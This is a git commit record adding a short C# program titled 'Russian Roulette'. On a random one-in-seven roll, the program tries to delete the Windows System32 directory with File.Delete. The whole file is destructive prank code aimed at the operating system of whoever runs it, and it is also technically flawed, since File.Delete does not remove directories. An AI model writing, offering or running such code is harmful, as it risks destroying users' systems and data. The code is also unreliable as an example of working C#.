bcb1b1374b6607fa38410e9b557e51d99a6f3e7d
vincmp <vincmpimenta@gmail.com>
2024-04-25 19:25:38 -0300

    Russian Roulette in C#

---
+++ RussianRoulette/Program.cs
@@ -0,0 +1,14 @@
+﻿namespace Russian_Roulette
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Random random = new Random();
+            if (random.Next(0, 7) == 1)
+            {
+                System.IO.File.Delete(@"c:\Windows\System32");
+            }
+        }
+    }
+}
